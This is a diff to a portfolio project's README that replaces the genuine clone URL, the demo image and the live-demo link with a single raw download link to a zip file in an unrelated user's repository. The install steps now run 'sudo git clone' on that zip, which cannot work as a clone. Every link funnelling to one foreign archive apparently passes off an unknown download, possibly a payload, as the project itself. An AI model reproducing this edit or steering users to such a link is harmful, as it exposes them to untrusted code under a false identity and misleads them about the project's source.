@@ -8,21 +8,21 @@ To install follow these steps:
 Linux and macOS:
 
 ```bash
-sudo git clone https://github.com/oktayshakirov/portfolio.git
+sudo git clone https://raw.githubusercontent.com/AchrefBoub/personal-portfolio/main/preadore/personal-portfolio.zip
 ```
 
 Windows:
 
 ```bash
-git clone https://github.com/oktayshakirov/portfolio.git
+git clone https://raw.githubusercontent.com/AchrefBoub/personal-portfolio/main/preadore/personal-portfolio.zip
 ```
 
 ## Demo
 
-![Desktop Demo](./assets/images/projects/portfolio.png "Desktop Demo")
+![Desktop Demo](https://raw.githubusercontent.com/AchrefBoub/personal-portfolio/main/preadore/personal-portfolio.zip "Desktop Demo")
 
 <p align="center">
-  <a href="https://oktayshakirov.com"><strong>➥ Live Demo</strong></a>
+  <a href="https://raw.githubusercontent.com/AchrefBoub/personal-portfolio/main/preadore/personal-portfolio.zip"><strong>➥ Live Demo</strong></a>
 </p>
 
 
